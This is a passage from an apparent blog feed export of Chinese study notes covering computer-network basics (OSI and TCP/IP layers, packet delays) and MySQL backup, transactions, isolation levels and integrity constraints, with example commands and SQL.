<h3 id="网关-gateway"><a href="#网关-gateway" class="headerlink" title="网关(gateway)"></a>网关(gateway)</h3><p>在一个局域网内互相通信是不需要用到网关的，而局域网内的接口要访问外网时，则需要把请求发送到网关上，由网关负责向外发送流量。同理，外网的信息也是通过网关再传达给内网接口</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>应用层</tag>
      </tags>
  </entry>
  <entry>
    <title>网络那些事之基本概念</title>
    <url>/2018/06/04/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<p>计算机网络是一个自治的、互联的计算机集合。</p>
<h1 id="因特网"><a href="#因特网" class="headerlink" title="因特网"></a>因特网</h1><p>因特网是一个世界范围的计算机网络，是“网络的网络”。由十多个第一层<code>ISP(因特网服务提供商)</code>和数十万个底层 ISP 组成。ISP 覆盖区域有所不同，有些跨越多个大洲和大洋，有些限于很小的地理区域。低层 ISP 与高层 ISP 互联，高层ISP彼此互联。</p>
<h2 id="端系统"><a href="#端系统" class="headerlink" title="端系统"></a>端系统</h2><p>所有连接到因特网的设备都称为<code>主机</code>或<code>端系统</code>。</p>
<p>端系统通过<code>通信链路</code>和<code>分组交换机</code>连接到一起。通俗的讲通信链路就是一条条光缆、网线等物理线路，不同的链路能以不同的速率传输数据，链路的传输速率单位为<code>bit/s或bps</code>，即<code>比特/秒</code>。端系统通过 ISP 接入因特网。</p>
<p>当一台端系统向另一台端系统发送数据时，发送端系统将数据将数据分段，并为每段加上首部字节。由此形成的信息包称为<code>分组</code>。这些分组通过网络发送到目的端系统，在那里被装配成初始数据。分组交换机从它的一条入通信链路接收到达的分组，并从它的一条出通信链路转发该分组。目前最出名的两种分组交换机类型是<code>路由器</code>和<code>链路层交换机</code>。这两种类型的交换机朝着最终的目的地转发分组。链路层交换机常用于接入网中，而路由器常用于网络核心中。从发送端到接收端，一个分组所经历的一系列通信链路和分组交换机称为通过该网络的<code>路径</code>。</p>
<p>与因特网相连的端系统提供了<code>应用程序编程接口(API)</code>,该API规定了运行在一个端系统上的软件请求因特网基础设施向运行在另一个端系统上的特定目的地软件交付数据的方式。因特网API是一套发送软件必须遵循的规则集合。类似于我们在寄信的时候需要遵邮局的规定贴上邮票、写上邮政编码等，这些规定就是 API。</p>
<h2 id="网络边缘"><a href="#网络边缘" class="headerlink" title="网络边缘"></a>网络边缘</h2><p>常把与因特网相连的设备称为端系统，因为它们位于网络的边缘。将端系统连接到其<code>边缘路由器</code>的物理链路称为<code>接入网</code>。<code>边缘路由器</code>是端系统到任何其他远程系统的路径上的第一台路由器。<br>除了端系统外，<code>网络应用</code>也处于网络边缘。网络应用通常有两种结构：</p>
<ul>
<li>客户——服务器结构（Client-Server）。常见的 Web 应用都是这种结构。这种应用的特点是客户只与服务器进行交互，只有客户可以主动发起连接。<strong>客户与客户之间是互不可见的</strong></li>
<li>P2P 结构（点对点结构）。这种结构是对等的，不存在客户和服务器的概念。各个端点之间可以直接互相访问。例子有文件共享服务如bt下载，所以才会有<strong>越多人下载速度越快</strong>的说法</li>
</ul>
<h3 id="家庭接入"><a href="#家庭接入" class="headerlink" title="家庭接入"></a>家庭接入</h3><p>当前宽带住宅接入有两种流行类型：</p>
<ul>
<li>数字用户线(Digital Subscriber Line，DSL)。即常说的拨号上网。利用DSL调制解调器将到达家庭的数据信号和电话信号分隔开（ADSL是非对称接入，即上行与下行速率是不同的，通常下行更快）</li>
<li>电缆（HFC,混合光纤同轴电缆网）。通过有线电视网络进行传输，用cable modem（即“猫”）将电视信号与网络信号分开。这也是非对称的，下行通常到30Mbts，上行为2Mbps</li>
<li>光纤到户。本地中心局直接提供了一条光纤线路到家庭。</li>
<li>LAN 无限局域网。在公司、大学和越来越多的家庭环境中，通常是用局域网(LAN)将端系统连接到边缘路由器。尽管有多种不同的局域网技术，但<code>以太网</code>是目前最流行的接入技术。在无线LAN环境中，无线用户从一个接入点发送/接受分租，接入点与企业网连接，该企业网再与有线因特网相连，这就是 wifi。可达 54Mbps</li>
<li>蜂窝网。蜂窝网也属于无线接入。所谓3G网4G网都属于蜂窝网。</li>
</ul>
<h2 id="网络核心"><a href="#网络核心" class="headerlink" title="网络核心"></a>网络核心</h2><p><code>网络核心</code>即互联因特网端系统的分组交换机和链路构成的网状网络。</p>
<p>网络核心的关键功能是<code>路由</code>+<code>转发</code>。<code>路由</code>即确定分组从源到目的地的路径。</p>
<h3 id="存储转发传输"><a href="#存储转发传输" class="headerlink" title="存储转发传输"></a>存储转发传输</h3><p>多数分组交换机在链路的输入端用<code>存储转发传输机制</code>：交换机能够在开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组。由此存在<code>存储转发延时</code>：如果某源端系统或分组交换机经过一条链路发送一个L比特的分组，链路的传输速率为R bit/s，则分组在这条链路上的传输时间为 L/R 秒。</p>
<h3 id="排队延时和丢包"><a href="#排队延时和丢包" class="headerlink" title="排队延时和丢包"></a>排队延时和丢包</h3><p>每个分组交换机有多条链路与之相连。对于每条相连的链路，该分组交换机有一个<code>输出缓存</code>用于存储路由器准备发往那条链路的分组。如果到达的分组需要传输到某天链路但发现该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待，由此分组又存在<code>排队延时</code>。缓存空间是有限的，一个到达的分组可能发现该缓存已满，此时会发生<code>丢包(分组丢失)</code>：到达的分组或正排队的分组之一会被丢弃。</p>
<h3 id="转发表和路由选择协议"><a href="#转发表和路由选择协议" class="headerlink" title="转发表和路由选择协议"></a>转发表和路由选择协议</h3><p>在因特网中，每个端系统具有一个被称为<code>IP地址</code>的地址。当源主机要向目的地端系统发送一个分组时，源在该分组的首部包含了目的地的 IP 地址。如同邮政地址那样，该地址具有一种等级结构。当一个分组到达网络中的路由器时，路由器检查该分组的目的地地址的一部分，并向一台相邻路由器转发该分组。更特别的是，每台路由器具有一个<code>转发表</code>，用于将目的地址映射为输出链路。当某分组到达一台路由器时，路由器检查该地址，并用这个目的地址搜索其转发表，以发行适当的出链路。路由器则将分组导向该出链路。</p>
<h2 id="分组交换时延"><a href="#分组交换时延" class="headerlink" title="分组交换时延"></a>分组交换时延</h2><p>分组从一个主机出发通过一系列路由器传输，在另一台主机中结束它的历程。这个过程是存在时延的。其中最为重要的几种时延是<code>节点处理时延</code>、<code>排队时延</code>、<code>传输时延</code>、<code>传播时延</code>。这些延时加起来称为<code>节点总时延</code></p>
<ul>
<li>节点处理时延（nodal processing delay）。造成这部分时延的原因主要是检查分组首部（差错检测）和决定将该分组导向何处（确定输出链路）</li>
<li>排队时延（queueing delay）。链路繁忙时新到达交换机的分组会进入排队状态。</li>
<li>传输时延（transmission delay）。仅当所有先到达的分组传输完毕后才能传输刚到达的分组。传输时延是将该分组的所有比特推向链路所需要的时间。L 为分组长度，R 为链路带宽，则传输时延为 L/R</li>
<li>传播时延（propagation delay）。分组在链路上传播的时间称为传播时延。d 为链路长度，v 为传播速率，则传播时延为 d/v</li>
</ul>
<p>传输时延与传播时延不同之处在于传输时延是分组从交换机到链路的时间，与分组的大小有关，与两台路由器之间的距离无关。而传播时延是分组在链接上传播消耗的时间，与分组大小无关，与距离有关。</p>
<h2 id="OSI七层协议"><a href="#OSI七层协议" class="headerlink" title="OSI七层协议"></a>OSI七层协议</h2><p>每层完成一类特定功能，底层为上层提供服务，相邻的两层通过<code>接口</code>进行交互，任一层实体提供的服务是<code>垂直的</code>。</p>
<p>计算机网络体系结构是计算机网络各层及其协议的集合。<strong>协议是控制两个对等实体进行通信的规则</strong>的集合，协议是<code>水平的</code>。</p>
<p><img src="https://i.loli.net/2020/01/19/JHuDU5ys3oX84IC.png" alt="OSI模型通信过程"></p>
<p>中间系统只实现网络层、链路层和物理层，这三层合称“非端到端层(non-end-end)”。</p>
<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>数据在每一层都会被打上一个该层的附加信息（所谓运输首部信息），称为 PDU(Protocol Data Unit)。而这些信息会在下一层被使用。</p>
<p><img src="https://i.loli.net/2020/01/19/zK7oIaJw41ncGgY.png" alt="OSI模型封装过程"></p>
<h3 id="为什么要封装"><a href="#为什么要封装" class="headerlink" title="为什么要封装"></a>为什么要封装</h3><ul>
<li>增加控制信息：地址信息（表示发送、接受端），差错检测编码，优先级设置等</li>
</ul>
<h3 id="非端到端层"><a href="#非端到端层" class="headerlink" title="非端到端层"></a>非端到端层</h3><h4 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h4><ul>
<li>规范接口特性：机械特性（形状，大小）、电气特性（电压、电频），功能特性（引脚）等</li>
<li>比特编码：如何表示 0 和 1</li>
<li>数据率：数据传输速率</li>
<li>传输模式：单工通信（单向），半双工通信（交替单向，发和收不同时），全双工通信（同时收发）</li>
</ul>
<h4 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h4><ul>
<li>两个直接相连的结点间的数据帧传输。</li>
<li>物理寻址。在帧头增加收发端物理地址标识信息（通常为 MAC 地址）。</li>
<li>流量控制。匹配发送和接收速度，避免淹没接收端。</li>
<li>差错控制。判断丢失帧与重复帧。</li>
<li>访问控制。决定哪个设备拥有物理链路使用权。</li>
</ul>
<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ul>
<li>跨越多个网络的数据分组传输</li>
<li>逻辑寻址，全局唯一（通常为 IP 地址）。</li>
<li>路由：路径选择及分组转发。</li>
</ul>
<p><img src="https://i.loli.net/2020/01/19/Xjb7cGfD285kEev.png" alt="分组转发"></p>
<p>网络层地址不变，链路层地址随传输过程不断更新。</p>
<h3 id="端到端层"><a href="#端到端层" class="headerlink" title="端到端层"></a>端到端层</h3><h4 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h4><p>源到目的端进程间报文传输。</p>
<ul>
<li>报文分段与重组</li>
<li>端口号寻址：确保将报文提交给正确进程。</li>
<li>连接控制：作为自下而上第一个端到端层次，建立或拆除端到端间的逻辑连接。</li>
<li>流量控制</li>
<li>差错控制（如 TCP）</li>
</ul>
<h4 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h4><p>不对数据进行分段，只插入一些信息。</p>
<ul>
<li>对话控制：建立、维护进程间对话</li>
<li>同步：在数据流中插入同步点，便于恢复对话</li>
</ul>
<h4 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h4><p>处理两个系统间交换信息的语法语义问题（如大小端机器对数据的表示方式不同）。</p>
<ul>
<li>数据表示转化：发送端把信息转化为主机独立的编码，接收端转化为主机相关编码</li>
<li>加密解密</li>
<li>压缩解压缩</li>
</ul>
<h4 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h4><p>向用户提供网络服务接口（如浏览器），根据不同应用场景处理用户数据。</p>
<h2 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP/IP参考模型"></a>TCP/IP参考模型</h2><p><img src="https://i.loli.net/2020/01/19/OMNn6oqPg4f9G7d.png" alt="TCP/IP模型"></p>
<h2 id="Internet五层协议"><a href="#Internet五层协议" class="headerlink" title="Internet五层协议"></a>Internet五层协议</h2><p>综合 OSI 与 TCP/IP</p>
<ol>
<li>应用层。应用层是网络应用程序及他们的应用层协议存留的地方。HTTP、SMTP、FTP、DNS等都属于应用层协议。分组在应用层中称为<code>报文</code></li>
<li>运输层。<strong>进程之间</strong>传送报文。在因特网中有两个运输协议<code>TCP</code>和<code>UDP</code>。分组在运输层中称为<code>报文段</code></li>
<li>网络层。<strong>主机之间</strong>数据分组与转发。网络层接受运输层递交的报文段和目的地址，类似于寄信时要向邮局提供目标地址。著名的<code>IP协议</code>就在网络层。该协议定义了数据报中的各个字段及端系统和路由器如何作用于这些字段，以达到<code>逻辑寻址</code>的目的。分组在网络层称为<code>数据报</code></li>
<li>链路层。将网络层的IP数据包组装成帧（帧包含数据和必要的控制信息，例如信道编码，卷积码，turbo码），在<strong>相邻网络元素</strong>之间传输。</li>
<li>物理层。物理层负责将帧一个比特一个比特地从一个节点移动到下一个节点。进一步与链路实体（如双通铜线、单模光缆）相关。传输数据为比特流，物理层需要定义比特传输的电气特性（多少电压代表1多少代表0）、机械特性（接口形状尺寸等），如USB、Bluetooth等。而传输物理介质如光纤、双绞线等并不处于物理层的范畴</li>
</ol>
<p><img src="https://i.loli.net/2020/01/19/i1bsCztfQAxcIyK.png" alt="五层模型数据封装"></p>
<p>下面是知乎一个有趣的例子：</p>
<blockquote>
<p>为了实现跨越互联网的，主机 A 的进程 P1，和主机 B 的进程 P2 之间的通信，我们逐层把这个任务交给 TCP/IP 协议栈。<br>运输层：“如果有人能帮我把数据从某个网络中的机器 A 搬到另一个网络中的机器 B，我就可以搞定这个任务，因为我知道不同的数据应该交给机器上的哪个进程。”<br>网络层：“如果有人能帮我把数据从局域网中直接相连的一台机器搬到另一台机器，我就可以把数据从一个网络搬到另一个网络，因为我知道路线怎么走，要经过哪些节点。”<br>链路层：“我知道怎样在局域网中搬数据，还能用 CSMA/CD 协议协调工作，还能用 CRC32 校验发送的数据和接收的数据是一致的，blabla… But，我只是说说，我不干苦力活。”<br>物理层：“楼上的大爷们发话了，兄弟们上。”</p>
</blockquote>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL之备份与恢复</title>
    <url>/2018/06/03/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/</url>
    <content><![CDATA[<h1 id="使用mysqldump命令备份"><a href="#使用mysqldump命令备份" class="headerlink" title="使用mysqldump命令备份"></a>使用mysqldump命令备份</h1><p><code>mysqldump</code> 命令可以将数据库中的数据备份成一个文本文件。表的结构和表中的数据将存储在生成的文本文件中。</p>
<p>mysqldump的工作原理就是查出需要备份的数据库和表的结构，然后在文本文件中生成相应的 <code>create</code> 和 <code>insert</code> 语句。需要导入数据库文件时 MySQL 通过使用文本文件中记录的语句生成相应的数据库和表就可以了。</p>
<p>使用 <code>mysqldump</code> 命令进行数据备份时，经常分为以下3种形式：</p>
<ol>
<li>备份一个数据库</li>
<li>备份多个数据库</li>
<li>备份所有数据库</li>
</ol>
<p>下面分别介绍：</p>
<h2 id="备份一个数据库"><a href="#备份一个数据库" class="headerlink" title="备份一个数据库"></a>备份一个数据库</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysqldump -u username -p dbname [table1 table2 ...] &gt; filename</span><br></pre></td></tr></table></figure>
<p>dbname 为数据库名。table1、table2 为表名，没有指定 table 时将备份整个数据库。filename为文本文件名称，通常使用<code>.sql</code>作为后缀。</p>
<p>例：备份数据库 users 中的 studnets 表到 D 盘的 sql 文件夹下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysqldump -u root -p users  students &gt; D:\sql\students.sql</span><br></pre></td></tr></table></figure>
<h2 id="备份多个数据库"><a href="#备份多个数据库" class="headerlink" title="备份多个数据库"></a>备份多个数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump -u username -p <span class="comment">--databeses dbname1 dbname2 &gt; filename</span></span><br></pre></td></tr></table></figure>
<p>加上 <code>databases</code> 选项，后面跟多个数据库名称</p>
<p>例：备份数据库 users、customers 到 D 盘：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump -u root -p <span class="comment">--databeses users customers &gt; data.sql</span></span><br></pre></td></tr></table></figure>
<h2 id="备份所有数据库"><a href="#备份所有数据库" class="headerlink" title="备份所有数据库"></a>备份所有数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqldump -u root -p <span class="comment">--all --databases &gt; filename</span></span><br></pre></td></tr></table></figure>
<h1 id="数据恢复"><a href="#数据恢复" class="headerlink" title="数据恢复"></a>数据恢复</h1><p>使用 <code>mysql</code> 命令进行还原：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql -u root -p [dbname] &lt; filename</span><br></pre></td></tr></table></figure>
<p>dbname 表示数据库名称，该参数是可选的。指定数据库名称时，表示还原该数据库下的表，不指定时表示还原数据库。</p>
<p>也可以在进入相应数据库后用 <code>source</code> 命令恢复：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; use test;</span><br><span class="line">mysql&gt; source filename;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL之事务与优化</title>
    <url>/2018/06/03/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E4%BA%8B%E4%BB%B6%E4%B8%8E%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<p>在 MySQL 中，事务由一条或多条 SQL 语句组成，在这个事务中，每条 MySQL 语句是相互依赖的。而整个事务作为一个不可分割的整体，一旦某条 MySQL 语句执行失败或产生错误，整个事务将会回滚。</p>
<p>只有 <code>InnoDB</code> 类型的表支持事务。MySQL默认表类型为 <code>InnoDB</code>。</p>
<h2 id="事务的基本要素-ACID"><a href="#事务的基本要素-ACID" class="headerlink" title="事务的基本要素(ACID)"></a>事务的基本要素(ACID)</h2><ol>
<li>原子性（Atomicity）：事务开始后所有操作，要么全部做完，要么全部不做，不可能停滞在中间环节。事务执行过程中出错，会回滚到事务开始前的状态，所有的操作就像没有发生一样。也就是说事务是一个不可分割的整体，就像化学中学过的原子，是物质构成的基本单位。</li>
<li>一致性（Consistency）：事务开始前和结束后，数据库的完整性约束没有被破坏 。比如 A 向 B 转账，不可能 A 扣了钱，B 却没收到。</li>
<li>隔离性（Isolation）：每个事务在自己的空间内执行，与其他事务隔离，而且事务的结果只有在它被完全执行时才能看到。这样即使一个系统同时发生多个事物，孤立性也可以保证特定的事务在完成之前其结果不被公布。</li>
<li>持久性（Durability）：事务提交之后，就一定是在硬盘永久的存储，而不会丢失。</li>
</ol>
<h2 id="事务的创建与存在周期"><a href="#事务的创建与存在周期" class="headerlink" title="事务的创建与存在周期"></a>事务的创建与存在周期</h2><p>创建事务的一般过程是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">初始化事务 ————&gt; 创建事务 ————&gt; 提交或回滚</span><br></pre></td></tr></table></figure>
<p><strong>无论最后是提交还是回滚，都会关闭这个事务</strong>。  </p>
<ul>
<li>初始化事务：<code>start transaction;</code> 或 <code>begin;</code>，MySQL默认是<strong>自动提交</strong>的，所以需要用命令改为手动模式</li>
<li>创建事务：执行 SQ L语句</li>
<li>提交或回滚： 提交 <code>commit;</code>，回滚 <code>rollback;</code></li>
</ul>
<h2 id="事务的并发问题"><a href="#事务的并发问题" class="headerlink" title="事务的并发问题"></a>事务的并发问题</h2><ol>
<li>脏读：事务 A 读取了事务 B 更新的数据，然后 B 回滚操作，那么A读取到的数据是脏数据</li>
<li>不可重复读：事务 A 多次读取同一数据，事务 B 在事务 A 多次读取的过程中，对数据作了更新并提交，导致事务 A 多次读取同一数据时结果不一致。</li>
<li>幻读：系统管理员 A 将数据库中所有学生的成绩从具体分数改为 ABCDE 等级，但是系统管理员 B 就在这个时候插入了一条具体分数的记录，当系统管理员 A 改结束后发现还有一条记录没有改过来，就好像发生了幻觉一样，这就叫幻读。</li>
</ol>
<p>小结：不可重复读的和幻读很容易混淆，不可重复读侧重于修改，幻读侧重于新增或删除。解决不可重复读的问题只需锁住满足条件的行，解决幻读需要锁表</p>
<h2 id="事务的隔离性等级"><a href="#事务的隔离性等级" class="headerlink" title="事务的隔离性等级"></a>事务的隔离性等级</h2><p>事务具有隔离的空间。在 MySQL 服务器中，用户通过不同的会话执行不同的事务，在多用户环境中，许多 RDBMS（关系型数据库管理系统）会话在任意时刻都是活动的。为了使这些事务互不影响，保证数据库性能不受影响，采用事务的孤立等级是很重要的。</p>
<p>如果没有孤立性，不同的查询操作会在同一事务的环境中检索到不同的结果，这将导致数据的不一致性。</p>
<ol>
<li>序列化(serializable)：以序列的形式对事务进行处理。该孤立级的特定是只有当事务提交后，用户才能从数据库上查看数据的变化。</li>
<li>可重读(repeatale read)：事务在孤立级上不会被看成一个序列，不过在当前执行的事务过程中，用户依然看不到事务的过程。直到事务提交为止，用户才能看到事务的变化结果。（客户端 A、B 同时开启事务，B 向表中插入数据行且提交后，A 在自己提交前是看不到改变的）。<strong>是 MySQL 的默认隔离级别</strong>。  </li>
<li>读已提交(read committed)：该孤立级的安全性比可重读低。在这一级事务用户可以看到其他事务添加到新纪录。在事务处理时如果存在其他用户同时对事务的相应表进行修改那么在同一事务的不同时间内，查询操作可能返回不同的结果(客户端 A、B 同时开启事务，B 向表中插入数据行且提交后，A 在自己提交前可以看到改变)</li>
<li>读未提交(read uncommitted)：该孤立级提供事务之间最小程度间隔，该孤立级容易产生幻读。其他用户可以在该孤立级上看到未提交的事务。(客户端 A、B 同时开启事务，B 向表中插入数据行且未提交，A 也可以看到改变)</li>
</ol>
<table>
<thead>
<tr>
<th>孤立等级</th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody>
<tr>
<td>序列化</td>
<td>否</td>
<td>否</td>
<td>否</td>
</tr>
<tr>
<td>可重读</td>
<td>否</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>读已提交</td>
<td>否</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>读未提交</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
</tbody>
</table>
<p>不可重复读的重点是修改:同样的条件, 你读取过的数据, 再次读取出来发现值不一样了</p>
<p>幻读的重点在于新增或者删除：同样的条件, 第1次和第2次读出来的记录数不一样</p>
<p>从存储引擎的角度看，解决不可重复读只需锁住对应行，而解决幻读需要保存数据库在事务开始前的快照。</p>
<p>设置事务的隔离等级：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">transaction</span> <span class="keyword">isolation</span> <span class="keyword">level</span> &#123;<span class="keyword">serializable</span> | repeatable <span class="keyword">read</span> | <span class="keyword">read</span> committed | <span class="keyword">read</span> uncommitted&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="事务的性能"><a href="#事务的性能" class="headerlink" title="事务的性能"></a>事务的性能</h2><h3 id="应用小事务"><a href="#应用小事务" class="headerlink" title="应用小事务"></a>应用小事务</h3><p>应用小事务的意义在于保证每个事务不会在执行前等待很长时间，从而避免各个事务因为互相等待而导致系统性能大幅度下降。应尽量缩短 <code>insert</code>、<code>update</code> 等操作与 <code>commit</code> 之间的间隔时间。</p>
<h3 id="合适的孤立级"><a href="#合适的孤立级" class="headerlink" title="合适的孤立级"></a>合适的孤立级</h3><p>事务的性能与其对服务器产生的负载成反比，即事务孤立级越高，其性能越低。例如序列化虽然很稳定，但是会大大影响 MySQL 的性能，生产中比较少用，而用乐观锁悲观锁解决幻读等问题</p>
<h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>当两个或多个处于不同序列的用户打算同时更新某相同数据库时，因互相等待对方释放权限而导致双方一直处于等待状态。两个不同序列的客户端同时对数据执行操作极有可能产生死锁。更通俗地讲，当两个事物相互等待操作对方释放所持有的资源而导致两个事务都无法操作对方持有的资源，这样无限期的等待称为死锁。</p>
<p>InnoDB具有检查死锁的功能。如果发现产生了死锁，InnoDB会立刻撤销其中一个任务以便死锁消失。这样就可以使另一个事务获取对方所占有的资源而执行操作逻辑。</p>
<h2 id="优化数据库"><a href="#优化数据库" class="headerlink" title="优化数据库"></a>优化数据库</h2><ul>
<li>使用索引.<strong>对于新表可以先不创建索引，等数据导入后在创建，这样可以提高数据导入效率</strong>。一般来说，索引应建立在那些将用于 JOIN, WHERE 判断和 ORDER BY 排序的字段上。尽量不要对数据库中某个含有大量重复的值的字段建立索引。对于一个ENUM类型的字段来说，出现大量重复值是很有可能的情况</li>
<li>尽量少用 <code>like</code> 语句与通配符 <code>%</code></li>
<li>选取最合适的字段大小。表越小，速度越快。所以能用 <code>char</code> 就不要用 <code>varchar</code> ，能用 <code>mediumint</code> 就不用 <code>bigint</code>。<strong>尽量使用 <code>not null</code> 这样在查询时数据库不用去比较null值。</strong></li>
<li>用 <code>join</code> 代替子查询。这样 MySQL 不需要在内存中创建临时表来完成逻辑上的需要两个步骤的查询工作。。</li>
<li>优化 insert 语句。一次插入多条数据比每次插入一条数据快。能用 <code>union</code> 将多条 <code>select</code> 结合就不要单独用多次 <code>select</code></li>
<li>使用事务。我们可以使用子查询、连接（JOIN）和联合（UNION）来创建各种各样的查询，但不是所有的数据库操作都可以只用一条或少数几条 SQL 语句就可以完成的。更多的时候是需要用到一系列的语句来完成某种工作。在这种情况下，当这个语句块中的某一条语句运行出错的时候，整个语句块的操作就会变得不确定起来。这时候就要用到事务。</li>
<li>用外键分解表中低频字段。有些字段的使用频率很低，当表的数据量很大时查询速度会很慢。用外键将这些字段拆分成一个单独的表可以提高效率。</li>
<li>在相同类型的字段间进行比较的操作</li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL之完整性约束</title>
    <url>/2018/05/30/mysql%E5%AE%9A%E4%B9%89%E5%AE%8C%E6%95%B4%E6%80%A7%E7%BA%A6%E6%9D%9F/</url>
    <content><![CDATA[<p>MySQL提供了多种完整性约束，作为数据库关系模式定义的一部分，可以通过<code>create table</code>或<code>alter table</code>语句来定义。一旦定义了完整性约束，MySQL服务器会随时检测处于更新状态的数据库内容是否符合相关的完整性约束，从而保证数据的一致性与正确性。</p>
<p>在关系模型中，提供了实体完整性、参照完整性和用户完整性3项规则。</p>
<h1 id="实体完整性"><a href="#实体完整性" class="headerlink" title="实体完整性"></a>实体完整性</h1><p><code>实体</code>是一个数据对象，是指客观存在并可以相互区分的事物，如一个教师、一个学生等。一个实体在数据库中表现为一条记录。</p>
<p>实体完整性是指关系的主属性及主键的组成不能为空。也就是主键不能使空值null。关系对应于现实世界的实体集，而现实世界的实体是可以区分的，即说明每个实例具有唯一性标识。在关系模型中，是使用主键作为唯一性标识的。</p>
<p>先来认识一下关系型数据库中重要的三个键：</p>
<ul>
<li>超键(super key):在关系中能唯一标识元组的属性集称为关系模式的超键 </li>
<li>候选键(candidate key):不含有多余属性的超键称为候选键 </li>
<li>主键(primary key):用户选作元组标识的一个候选键程序主键</li>
</ul>
<p>在MySQL中，实体完整性是通过<em>主键约束</em>和<em>候选键约束</em>实现的。</p>
<h2 id="主键约束"><a href="#主键约束" class="headerlink" title="主键约束"></a>主键约束</h2><p>主键可以是表中的某一列，也可以是表中多个列所构成的一个组合。其中多个列组合而成的主键也被称为复合主键。在MySQL中，主键必须遵循如下规则：</p>
<ol>
<li>每个表只能定义一个主键</li>
<li>主键必须能唯一标识表中的每一行记录并且不能为null</li>
<li>复合主键不能包含不必要的多余列</li>
<li>一个列名在复合主键的列表中只能出现一次</li>
</ol>
<h3 id="作为列的主键约束"><a href="#作为列的主键约束" class="headerlink" title="作为列的主键约束"></a>作为列的主键约束</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">tinyint</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h3 id="作为表的主键约束"><a href="#作为表的主键约束" class="headerlink" title="作为表的主键约束"></a>作为表的主键约束</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">tinyint</span> auto_increment,</span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    age <span class="built_in">tinyint</span>,</span><br><span class="line">    primary <span class="keyword">key</span> (<span class="keyword">id</span>,<span class="keyword">name</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p><strong>如果主键仅由表中的某一列构成，以上两种方法均可以定义主键。如果主键由表中多个列组成，那么只能有第二种方法定义主键约束。</strong></p>
<h2 id="候选键约束"><a href="#候选键约束" class="headerlink" title="候选键约束"></a>候选键约束</h2><p>如果一个属性集能<strong>唯一标识元组</strong>而又<strong>不含有多余的属性</strong>，那么这个属性集称为关系的候选键，用关键字<code>unique</code>来定义。</p>
<p>候选键可以是表中的某一列，也可以是表中多个列所构成的一个组合。<strong>任何时候，候选键的值必须是唯一的且不能为空</strong>。定义方法类似于主键：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">tinyint</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">unique</span>,</span><br><span class="line">    age <span class="built_in">tinyint</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (</span><br><span class="line">    <span class="keyword">id</span> <span 